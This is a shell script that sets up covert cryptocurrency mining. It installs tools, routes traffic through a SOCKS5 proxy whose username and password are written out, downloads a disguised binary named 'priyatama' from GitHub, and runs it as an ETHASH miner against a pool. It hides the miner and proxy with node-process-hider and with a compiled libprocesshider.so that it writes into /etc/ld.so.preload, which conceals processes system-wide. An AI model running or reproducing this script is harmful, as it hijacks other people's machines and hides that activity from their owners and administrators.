#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.15.39.186:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider
ph add graftcp
ph add priyatama
POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=DHB
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)

./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
